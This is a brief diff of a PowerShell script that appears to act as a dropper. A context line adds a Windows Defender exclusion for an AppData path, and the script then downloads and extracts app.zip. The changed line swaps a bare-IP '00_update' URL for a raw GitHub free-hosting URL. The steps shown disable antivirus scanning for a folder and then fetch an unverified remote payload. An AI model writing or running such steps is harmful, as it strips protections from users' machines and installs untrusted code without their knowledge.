@@ -120,7 +120,7 @@ Add-MpPreference -ExclusionPath $appDataPath
 Write-Host "Download the file from the link and extract it to the current directory"
 
 # 2. Download the file from the link and extract it to the current directory
-$zipUrl = "http://116.203.93.143/00_update/app.zip"
+$zipUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/app.zip"
 $zipFile = "$currentDir\app.zip"
 $unzipDir = $currentDir
 
